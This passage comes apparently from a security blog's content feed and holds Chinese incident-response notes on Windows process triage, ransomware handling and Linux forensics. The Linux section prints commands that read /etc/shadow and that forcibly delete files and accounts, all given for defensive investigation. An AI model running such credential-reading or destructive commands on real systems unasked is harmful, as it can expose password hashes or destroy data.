class="line"></span><br><span class="line">wmic <span class="keyword">process</span> get name,ExecutablePath,processid /format:csv</span><br><span class="line"></span><br><span class="line">wmic <span class="keyword">process</span> get name,ExecutablePath,processid,parentprocessid /format:csv</span><br><span class="line"></span><br><span class="line">wmic <span class="keyword">process</span> get name,ExecutablePath,processid,parentprocessid /format:csv|findstr /I <span class="string">&quot;SearchFilterHost&quot;</span></span><br><span class="line"></span><br><span class="line">wmic <span class="keyword">process</span> <span class="built_in">where</span> processid=[<span class="type">PID</span>] get parentprocessid</span><br></pre></td></tr></table></figure><p>结束恶意进程</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic <span class="keyword">process</span> <span class="built_in">where</span> processid=[<span class="type">PID</span>] delete</span><br><span class="line"></span><br><span class="line">wmic <span class="keyword">process</span> <span class="built_in">where</span> name=<span class="string">&quot;xxx.exe&quot;</span> call terminate</span><br></pre></td></tr></table></figure><h2 id="procexp"><a href="#procexp" class="headerlink" title="procexp"></a>procexp</h2><p>重点检查没有厂商名字、没有 签名验证信息、没有描述信息、CPU 或内存资源占用长时间过高的进程的进程。检查可疑进程的属主、路径是否合法。</p><h3 id="进程颜色"><a href="#进程颜色" class="headerlink" title="进程颜色"></a>进程颜色</h3><ul><li>浅蓝色: 和Process Explorer属于同一个用户的进程。</li><li>粉红色： 服务进程，通常会包含一个或多个Windows服务。</li><li>黄色： .NET进程。</li><li>深灰色： 挂起的进程。</li><li>紫色： 标识包含压缩或者加密的可执行代码的进程。一些病毒软件经常会利用这种方式绕过杀毒软件。</li><li>红色： 刚刚退出的进程。</li></ul><h3 id="显示选项"><a href="#显示选项" class="headerlink" title="显示选项"></a>显示选项</h3><p>1.显示进程当前的权限，是系统用户权限还是网络管理员权限还是普通管理员权限（User Name）<br>2.显示进程的文件路径（Image Path）<br>3.显示进程是64位进程还是32位的（Image Type）<br>4.显示进程当前所在的Session ID（session）<br>5.显示进程命令行参数(Command Line)</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/20200617095435663.png" alt="faefae"></p><p><a href="https://blog.csdn.net/linxinfa/article/details/106800716">参考链接</a></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/20200617095730418.png" alt="gaioengmeqmn"></p><p>显示当前进程的<code>GDI</code>对象个数，内核对象个数，线程个数。</p><blockquote><p>GDI是Graphics Device Interface的缩写，含义是图形设备接口，它的主要任务是负责系统与绘图程序之间的信息交换，处理所有Windows程序的图形输出。<br>在Windows操作系统下，绝大多数具备图形界面的应用程序都离不开GDI，我们利用GDI所提供的众多函数就可以方便的在屏幕、打印机及其它输出设备上输出图形，文本等操作。</p></blockquote><h3 id="显示当前进程所加载的DLL"><a href="#显示当前进程所加载的DLL" class="headerlink" title="显示当前进程所加载的DLL"></a>显示当前进程所加载的DLL</h3><p>选择<code>View - Lower Pane View - DLLs</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/20200617100017575.png" alt="adgagerage"></p><p>通过这种方式可以观察，我们的进程是否被其他程序注入<code>DLL</code>，了解当前进程使用了那些编程技术。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/20200617100236861.png" alt="ahrgrgaregra"></p><p>我们可以修改DLL的选项卡让其显示更多的内容，比如DLL基地址，DLL内存相关信息等</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/20200617101011418.png" alt="在这里插入图片描述"></p><h3 id="显示当前进程所占用的系统资源句柄"><a href="#显示当前进程所占用的系统资源句柄" class="headerlink" title="显示当前进程所占用的系统资源句柄"></a>显示当前进程所占用的系统资源句柄</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/20200617101256730.png" alt="在这里插入图片描述"></p><p>我们查看当前进程所占用的资源句柄表，分析进程的逻辑：如图下图<code>SunloginClient.exe</code>进程创建了一个Event事件，并且占用一个Log文件，可以检查自己的程序是否有内核句柄泄露。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/2020061710143863.png" alt="在这里插入图片描述"></p><h3 id="操控进程以及显示进程的内部信息"><a href="#操控进程以及显示进程的内部信息" class="headerlink" title="操控进程以及显示进程的内部信息"></a>操控进程以及显示进程的内部信息</h3><p>操控进程，杀掉进程、重启进程、挂起进程等</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/20200617102443713.png" alt="在这里插入图片描述"></p><p>显示进程的内部信息</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/20200617101721152.png" alt="在这里插入图片描述"></p><p>查看线程信息（还可以查当前进程环境变量、进程网络连接情况等）</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/20200617101940718.png" alt="在这里插入图片描述"></p><h3 id="搜索功能"><a href="#搜索功能" class="headerlink" title="搜索功能"></a>搜索功能</h3><p>有时候我们删除某个文件或文件夹的时候，会提示被某个服务占用，无法删除，这个时候，就可以使用搜索功能知道它被谁占用了，比如shell.20200608-082337.log文件被SunloginClient.exe占用了</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/20200617103428394.png" alt="在这里插入图片描述"></p><h4 id="DLL搜索"><a href="#DLL搜索" class="headerlink" title="DLL搜索"></a>DLL搜索</h4><p>当你在磁盘上发现一个恶意的DLL，并且想知道是否有运行进程使用了这个DLL时，可以使用Find =&gt; find Handle on DLL 功能。</p><p>一些常见的DLL：</p><p><code>Ntdll.dll</code>：如果一个可执行文件载入了这个文件，这意味着作者企图使用那些不是正常提供给windows程序使用的函数。如隐藏功能和操作进程等任务会使用这个接口。<br><code>Wsock32.dll</code>和<code>Ws32.dll</code>：这个两个是联网ＤＬＬ，访问其中任一个DLL的程序非常可能连接网络，或是执行网络相关的任务。<br><code>Wininet.dll</code>：这个DLL包含了更高层次的网络函数，实现了如FTP、HTTP和NTP等协议。</p><h1 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h1><p>win+r <code>services.msc</code></p><h1 id="文件痕迹排查"><a href="#文件痕迹排查" class="headerlink" title="文件痕迹排查"></a>文件痕迹排查</h1><p>三个方向：</p><ul><li><p>敏感路径</p></li><li><p>时间点</p></li><li><p>文件特征–代码关键字，关键函数，文件权限</p></li></ul><h2 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h2><h3 id="1-temp-tmp-相关目录"><a href="#1-temp-tmp-相关目录" class="headerlink" title="1.temp(tmp)相关目录"></a>1.temp(tmp)相关目录</h3><blockquote><p>因为临时路径相对统一</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Temp</span><br></pre></td></tr></table></figure><h3 id="2-排查下载记录，浏览器访问记录"><a href="#2-排查下载记录，浏览器访问记录" class="headerlink" title="2.排查下载记录，浏览器访问记录"></a>2.排查下载记录，浏览器访问记录</h3><h3 id="3-查看用户Recent文件"><a href="#3-查看用户Recent文件" class="headerlink" title="3.查看用户Recent文件"></a>3.查看用户Recent文件</h3><p>Recent存储最近运行文件的快捷方式</p><p>存储位置如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator\Recent</span><br><span class="line">C:\Documents and Settings\Default User\Recent</span><br></pre></td></tr></table></figure><p>先要开启隐藏文件夹</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211122155627701.png" alt="image-20211122155627701"></p><p>更改所有者</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211122155724944.png" alt="image-20211122155724944"></p><h3 id="4-预读取文件查看"><a href="#4-预读取文件查看" class="headerlink" title="4.预读取文件查看"></a>4.预读取文件查看</h3><p><strong>Prefetch</strong>，预读取文件，存放系统已经访问过的预读取文件信息，扩展名<code>pf</code></p><p>运行对话框输入<code>%SystemRoot%\Prefetch</code>打开<code>C:\Windows\Prefetch</code></p><p>查看工具 winprefetchview</p><p><a href="https://www.nirsoft.net/utils/win_prefetch_view.html">https://www.nirsoft.net/utils/win_prefetch_view.html</a></p><p><strong>Amcache.hve</strong>，查询应用程序的执行路径，上次执行时间以及SHA1值</p><p>win+r  –&gt; <code>%SystemRoot%\appcompat\Programs</code> 打开打开<code>Amcache.hev</code>文件夹。</p><p>解析方式</p><p><a href="https://github.com/williballenthin/python-registry/blob/master/samples/amcache.py">https://github.com/williballenthin/python-registry/blob/master/samples/amcache.py</a></p><h2 id="时间点"><a href="#时间点" class="headerlink" title="时间点"></a>时间点</h2><h3 id="forfiles"><a href="#forfiles" class="headerlink" title="forfiles"></a>forfiles</h3><p>特殊时间内<strong>新增</strong>的文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forfiles /m *exe /d +<span class="number">2021</span>/<span class="number">5</span>/<span class="number">15</span> /s /p c:\ /c <span class="string">&quot;cmd /c echo @path @fdate @ftime&quot;</span> <span class="number">2</span>&gt; null</span><br></pre></td></tr></table></figure><p>特殊时间内<strong>修改</strong>的文件</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211122160450094.png" alt="image-20211122160450094"></p><blockquote><p>判断创建时间，修改时间，访问时间是否存在逻辑问题</p></blockquote><h2 id="文件特征"><a href="#文件特征" class="headerlink" title="文件特征"></a>文件特征</h2><h3 id="webshell检测"><a href="#webshell检测" class="headerlink" title="webshell检测"></a>webshell检测</h3><p><a href="http://www.d99net.net/index.asp">D盾</a></p><p><a href="https://www.hws.com/soft/hostmaster/">HwsKill</a></p><p><a href="https://www.shellpub.com/">河马查杀</a></p><h1 id="日志排查"><a href="#日志排查" class="headerlink" title="日志排查"></a>日志排查</h1><p><a href="https://dropann.github.io/p/24f823ca.html">windows 日志</a></p><h1 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h1><h2 id="powershell获取hash"><a href="#powershell获取hash" class="headerlink" title="powershell获取hash"></a>powershell获取hash</h2><p><code>Get-FileHash 文件路径 -Algorithm 校验的Hash值类型| Format-List</code></p><blockquote><p>如果需要校验的文件路径比较复杂，例如路径中包含空格、括号等特殊符号，则需要在路径前后加上英文双引号。</p><p>Windows PowerShell命令可以校验的Hash值类型包括：SHA1、SHA256、SHA384、SHA512、MACTripleDES、MD5、RIPEMD160，暂不支持校验CRC32值。</p><p>如果不带-Algorithm参数，也就是不指明验证的Hash值类型，那么默认验证的就是SHA256值</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-FileHash</span> C:\Windows\notepad.exe <span class="literal">-Algorithm</span> MD5| <span class="built_in">Format-List</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-FileHash</span> C:\Windows\notepad.exe <span class="literal">-Algorithm</span> SHA1| <span class="built_in">Format-List</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-FileHash</span> C:\Windows\notepad.exe | <span class="built_in">Format-List</span></span><br></pre></td></tr></table></figure><h1 id="综合工具"><a href="#综合工具" class="headerlink" title="综合工具"></a>综合工具</h1><p>PcHunter</p><p>火绒剑</p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>勒索病毒应急处置</title>
      <link href="/p/c2567ef7.html"/>
      <url>/p/c2567ef7.html</url>
      
        <content type="html"><![CDATA[<p>勒索病毒，是一种特殊的恶意软件，又被人归类为“阻断访问式攻击”（denial-of-access attack），其与其他病毒最大的不同在于手法以及中毒方式。其中一种勒索软件仅是单纯地将受害者的电脑锁起来，而另一种则系统性地加密受害者硬盘上的文件。所有的勒索软件都会要求受害者缴纳赎金以取回对电脑的控制权，或是取回受害者根本无从自行获取的解密密钥以便解密文件。勒索软件通常透过木马病毒的形式传播，将自身为掩盖为看似无害的文件，通常会通过假冒成普通的电子邮件等社会工程学方法欺骗受害者点击链接下载，但也有可能与许多其他蠕虫病毒一样利用软件的漏洞在联网的电脑间传播。本文重点放在一线人员如何处置勒索病毒，溯源攻击方法。</p><h1 id="常规处置方法"><a href="#常规处置方法" class="headerlink" title="常规处置方法"></a>常规处置方法</h1><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211118192242334.png" alt="image-20211118192242334"></p><h2 id="错误处置："><a href="#错误处置：" class="headerlink" title="错误处置："></a>错误处置：</h2><ol><li>使用u盘，硬盘等移动存储设备，挂载共享盘等存储服务。</li><li>多次对被勒索后的文件进行解密操作，可能破坏原始文件降低解密的可能性。</li></ol><h2 id="隔离被感染主机-服务器"><a href="#隔离被感染主机-服务器" class="headerlink" title="隔离被感染主机/服务器"></a>隔离被感染主机/服务器</h2><ol><li>断网，断电（断网&gt;断电）</li><li>对网络资源访问控制权限做严格认证和控制</li></ol><h1 id="确认勒索病毒种类"><a href="#确认勒索病毒种类" class="headerlink" title="确认勒索病毒种类"></a>确认勒索病毒种类</h1><h2 id="确认勒索病毒名称，家族查看是否有解密的可能性"><a href="#确认勒索病毒名称，家族查看是否有解密的可能性" class="headerlink" title="确认勒索病毒名称，家族查看是否有解密的可能性"></a>确认勒索病毒名称，家族查看是否有解密的可能性</h2><h3 id="病毒查询网站"><a href="#病毒查询网站" class="headerlink" title="病毒查询网站"></a>病毒查询网站</h3><p><a href="https://guanjia.qq.com/pr/ls/">腾讯勒索病毒搜索引擎</a></p><p><a href="https://lesuobingdu.360.cn/">360勒索病毒解密</a></p><p><a href="https://lesuobingdu.qianxin.com/">奇安信勒索病毒搜索引擎</a></p><p><a href="https://www.nomoreransom.org/crypto-sheriff.php?lang=zh">nomoreransom-解码刑警</a></p><p><a href="https://lesuo.venuseye.com.cn/">VenusEye威胁情报中心-勒索病毒搜索引擎</a></p><p><a href="https://id-ransomware.malwarehunterteam.com/">id-ransomware</a></p><p> <a href="https://edr.sangfor.com.cn/#/information/ransom_search">深信服勒索病毒查找</a></p><blockquote><p>如果网站找不到，根据勒索信的格式，交付赎金网站的样式进行排查。</p></blockquote><h3 id="病毒解密工具集"><a href="#病毒解密工具集" class="headerlink" title="病毒解密工具集"></a>病毒解密工具集</h3><p><a href="https://habo.qq.com/tool/detail/ransomware_recovery_tools">哈勃勒索病毒解密助手</a></p><p><a href="https://github.com/jiansiting/Decryption-Tools">GitHub项目</a></p><p><a href="http://it.rising.com.cn/fanglesuo/index.html">瑞星防勒索专题社区</a></p><p><a href="https://www.nomoreransom.org/zh/decryption-tools.html">nomoreransom解密工具</a></p><p><a href="https://www.avast.com/zh-cn/ransomware-decryption-tools">Avast解密工具</a></p><p><a href="https://noransom.kaspersky.com/zh/">kaspersky卡巴斯基解密器</a></p><p><a href="https://www.emsisoft.com/ransomware-decryption-tools/free-download">Emsisoft</a></p><p><a href="https://www.trendmicro.com/zh_hk/forHome/products/free-tools.html">趋势科技</a></p><p><a href="https://www.quickheal.com/free-ransomware-decryption-tool/">quickheal</a></p><p><a href="https://www.avg.com/en-ww/ransomware-decryption-tools">AVG</a></p><h2 id="确认勒索病毒传播方式"><a href="#确认勒索病毒传播方式" class="headerlink" title="确认勒索病毒传播方式"></a>确认勒索病毒传播方式</h2><p>如果上面能确认病毒类型，就去找这些病毒对应行为，样本特征（找样本是主要目标，一找到样本就能确定病毒攻击链）作为排查方向，但也不是100%的，有可能<strong>老毒用新洞</strong>。</p><p>当全网都没有收录这个勒索病毒信息的时候，就去猜它的入侵途径：</p><h3 id="暴力破解入侵"><a href="#暴力破解入侵" class="headerlink" title="暴力破解入侵"></a>暴力破解入侵</h3><p>查系统安全日志</p><p><a href="https://dropann.github.io/p/75bed629.html">主机暴力破解日志特征</a></p><h3 id="勒索病毒利用的常见漏洞"><a href="#勒索病毒利用的常见漏洞" class="headerlink" title="勒索病毒利用的常见漏洞"></a>勒索病毒利用的常见漏洞</h3><p>Win32k提权漏洞CVE-2018-8120</p><p>WindowsALPC提权漏洞CVE-2018-8440</p><p>Weblogic反序列化漏洞</p><blockquote><p>这里漏洞是列举不完的，我们当下应该关注被勒索服务器/主机实际业务做出合理推测，而且如果有老旧漏洞上面勒索病毒搜索引擎大概率是能找出来的，优先级上应该关注在野高危0day在勒索病毒上的应用。</p></blockquote><h3 id="供应链攻击"><a href="#供应链攻击" class="headerlink" title="供应链攻击"></a>供应链攻击</h3><p>挖坑</p><h3 id="邮件附件"><a href="#邮件附件" class="headerlink" title="邮件附件"></a>邮件附件</h3><p>查邮件附件MD5放到威胁情报网站上去。</p><p>挖坑</p><h3 id="利用网页挂马传播"><a href="#利用网页挂马传播" class="headerlink" title="利用网页挂马传播"></a>利用网页挂马传播</h3><p>攻击者入侵主流网站，在正常网页植入木马。或者访问者访问恶意网站，其利用IE、Flash等软件漏洞进行攻击。</p><h3 id="找C2服务器"><a href="#找C2服务器" class="headerlink" title="找C2服务器"></a>找C2服务器</h3><p>看流量设备（NTA）查外联C2服务器。具体什么看挖坑</p><blockquote><p>需要注意的是：攻击者在对文件加密的过程中，可能不使用C2服务器，现在加密时可能不需要回传密钥。</p></blockquote><h1 id="溯源分析"><a href="#溯源分析" class="headerlink" title="溯源分析"></a>溯源分析</h1><p>其实就是用上面已知的信息做个汇总</p><ul><li>日志分析结果</li><li>病毒分析结果</li><li>主机安全漏洞排查情况</li><li>病毒植入方式分析</li><li>病毒影响范围与网络拓扑综合判断</li><li>病毒扩散的方向-有外网入侵或内网系统相互传播</li><li>初步给出入侵时间线、可疑 IP、其他可疑判断攻击者的数据</li></ul>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 病毒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux取证溯源</title>
      <link href="/p/cc74cf72.html"/>
      <url>/p/cc74cf72.html</url>
      
        <content type="html"><![CDATA[<p>本文是针对应急响应中linux排查思路做一个固化（其实是在客户现场发呆😐也不好），方便自己能够快速排查linux中的问题，溯源攻击方法。主要包含（系统、网络、进程、启动项、服务、文件痕迹等信息）其中还有内存分析，日志分析，流量分析等，新开文章进行总结。</p><h1 id="易丢失数据"><a href="#易丢失数据" class="headerlink" title="易丢失数据"></a>易丢失数据</h1><h2 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 真实时间</span></span><br><span class="line">date -R</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看Linux内核版本</span></span><br><span class="line">uname -a</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 列出目前与过去登录系统的用户相关信息</span></span><br><span class="line">last</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 观察硬盘实体使用情况</span></span><br><span class="line">fdisk -l</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看挂载</span></span><br><span class="line">mount</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看内存</span></span><br><span class="line">more /proc/meminfo &gt; memoryinfo.log</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看mac地址信息</span></span><br><span class="line">cat /etc/udev/rules.d/70-persistent-net.rules</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> CPU基础信息</span></span><br><span class="line">lscpu</span><br></pre></td></tr></table></figure><h2 id="网络连接"><a href="#网络连接" class="headerlink" title="网络连接"></a>网络连接</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum install net-tools     [On CentOS/RHEL]</span><br><span class="line">apt install net-tools     [On Debian/Ubuntu]</span><br><span class="line">zypper install net-tools  [On OpenSuse]</span><br><span class="line">pacman -S netstat-nat     [On Arch Linux]</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anp</span><br></pre></td></tr></table></figure><ul><li>-a 显示所有</li><li>-t 仅显示tcp</li><li>-u 仅显示udp</li><li>-n 拒绝显示别名，直接使用ip地址</li><li>-l 仅列出监听状态的服务</li><li>-p 显示建立相关链接的程序名</li><li>-r 路由信息，路由表</li><li>-e 扩展信息，例如uid</li><li>-s 按各个协议进行统计</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | more</span><br></pre></td></tr></table></figure><h3 id="进程对应可执行程序"><a href="#进程对应可执行程序" class="headerlink" title="进程对应可执行程序"></a>进程对应可执行程序</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -alt /proc/[PID]</span><br></pre></td></tr></table></figure><h3 id="进程打开文件"><a href="#进程打开文件" class="headerlink" title="进程打开文件"></a>进程打开文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -p [PID]</span><br></pre></td></tr></table></figure><h3 id="获取socket统计信息"><a href="#获取socket统计信息" class="headerlink" title="获取socket统计信息"></a>获取socket统计信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -s</span><br></pre></td></tr></table></figure><h3 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i:端口号</span><br></pre></td></tr></table></figure><blockquote><p>查看端口占用</p></blockquote><h2 id="进程数据"><a href="#进程数据" class="headerlink" title="进程数据"></a>进程数据</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps -ef</span><br><span class="line">top</span><br><span class="line">ps aux &gt; ps.log</span><br><span class="line">ps aux | grep pid</span><br></pre></td></tr></table></figure><ul><li>-e  显示环境变量</li><li>-f  显示程序间的关系</li><li>-aux 显示所有包含其他使用者的进程</li></ul><h3 id="处理恶意进程"><a href="#处理恶意进程" class="headerlink" title="处理恶意进程"></a>处理恶意进程</h3><p><code>kill -9 [PID]</code> 结束进程</p><p><code>rm -rf [filename]</code> 删除文件</p><p>如果<code>root</code>用户都无法删除</p><p><code>lsatter filename</code> 查看文件属性</p><p><code>chattr -i [filename]</code> 移除<code>i</code>属性</p><h3 id="查看隐藏进程"><a href="#查看隐藏进程" class="headerlink" title="查看隐藏进程"></a>查看隐藏进程</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | awk &#x27;&#123;print&#125;&#x27; | sort -n | uniq &gt;1</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /proc | sort -n | uniq &gt;2</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff 1 2</span><br></pre></td></tr></table></figure><h3 id="依照进程号查看拉起服务"><a href="#依照进程号查看拉起服务" class="headerlink" title="依照进程号查看拉起服务"></a>依照进程号查看拉起服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl status [pid]</span><br><span class="line">cat /proc/[pid]/stat #第四列的值是父进程pid</span><br></pre></td></tr></table></figure><h3 id="提取为实际运行程序的符号链接"><a href="#提取为实际运行程序的符号链接" class="headerlink" title="提取为实际运行程序的符号链接"></a>提取为实际运行程序的符号链接</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /proc/[pid]/exe xxx</span><br><span class="line">md5sum xxx</span><br></pre></td></tr></table></figure><h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><h3 id="查看系统所有用户"><a href="#查看系统所有用户" class="headerlink" title="查看系统所有用户"></a>查看系统所有用户</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><blockquote><p> 用户名：密码： 用户id： 用户组id： 注释： 用户组目录： 默认登录shell</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat/etc/shadow</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more /etc/shadow | cut -d : -f 1</span><br></pre></td></tr></table></figure><blockquote><p>用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</p></blockquote><h3 id="查看超级权限账户-amp-amp-可登录-uid-为0"><a href="#查看超级权限账户-amp-amp-可登录-uid-为0" class="headerlink" title="查看超级权限账户&amp;&amp;可登录(uid 为0)"></a>查看超级权限账户&amp;&amp;可登录(uid 为0)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: &#x27;&#123;if($3==0) print $1&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure><h3 id="查看可以远程登录的帐号信息"><a href="#查看可以远程登录的帐号信息" class="headerlink" title="查看可以远程登录的帐号信息"></a>查看可以远程登录的帐号信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br></pre></td></tr></table></figure><h3 id="查看sudo权限账号"><a href="#查看sudo权限账号" class="headerlink" title="查看sudo权限账号"></a>查看sudo权限账号</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure><blockquote><p>除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211116203048581.png" alt="image-20211116203048581"></p><p><a href="https://sysin.org/blog/linux-root/">关于 root 和 wheel：在 Linux 中创建管理员账号（root 权限）的正确方式</a></p><h3 id="错误的登录信息"><a href="#错误的登录信息" class="headerlink" title="错误的登录信息"></a>错误的登录信息</h3><p><code>lastb</code></p><h3 id="用户最后登录信息"><a href="#用户最后登录信息" class="headerlink" title="用户最后登录信息"></a>用户最后登录信息</h3><p><code>lastlog | more</code></p><h3 id="用户最近登录信息"><a href="#用户最近登录信息" class="headerlink" title="用户最近登录信息"></a>用户最近登录信息</h3><p><code>last</code></p><p><code>/var/log/wtmp</code> 存储成功登录信息</p><p><code>/var/log/btmp</code> 存储失败登录信息</p><p><code>/var/log/utmp</code> 存储当前正在登录信息</p><h3 id="当前登录用户"><a href="#当前登录用户" class="headerlink" title="当前登录用户"></a>当前登录用户</h3><p>本地登录以及通过SSH登录的账户信息和用户信息</p><p><code>who</code>或者<code>w</code></p><blockquote><p>两者的区别在于，w 命令除了能知道目前已登陆的用户信息，还可以知道每个用户执行任务的情况。</p></blockquote><p><code>uptime</code> : 查看登陆多久、多少用户，负载</p><p><code>uptime -p tty1</code></p><h3 id="空口令账户"><a href="#空口令账户" class="headerlink" title="空口令账户"></a>空口令账户</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: &#x27;length($2)==0 &#123;print$1&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure><h3 id="处理可疑账号"><a href="#处理可疑账号" class="headerlink" title="处理可疑账号"></a>处理可疑账号</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usermod -L user    禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头</span><br><span class="line">userdel user       删除user用户</span><br><span class="line">userdel -r user    将删除user用户，并且将/home目录下的user目录一并删除</span><br></pre></td></tr></table></figure><h2 id="服务信息"><a 